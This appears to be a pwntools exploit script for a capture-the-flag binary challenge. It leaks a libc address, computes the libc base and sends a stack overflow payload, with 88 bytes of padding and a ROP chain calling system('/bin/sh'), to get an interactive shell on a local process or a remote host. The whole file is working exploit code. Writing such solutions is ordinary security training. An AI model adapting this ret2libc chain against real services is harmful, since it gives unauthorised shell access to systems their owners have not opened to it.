#!/usr/bin/env python3

from pwn import *

exe = ELF("./test_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, """
            b * vulnerable_function+183
            c
                       """)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    r.sendlineafter("Index >", "9")
    libc_leak = int(r.recvuntil("Now").split(b"you: ")[1].split(b"\n")[0], 16)
    libc.address = libc_leak - 0x2a1ca

    log.success(f"Libc leak : {hex(libc_leak)} and libc base : {hex(libc.address)}")
    libc_rop = ROP(libc)

    payload = flat(
        "A" * 88,
        p64(libc_rop.find_gadget(["pop rdi", "ret"])[0]),
        next(libc.search("/bin/sh")),
        p64(libc_rop.find_gadget(["ret"])[0]),
        libc.sym.system
    )
    r.sendlineafter("> ", payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
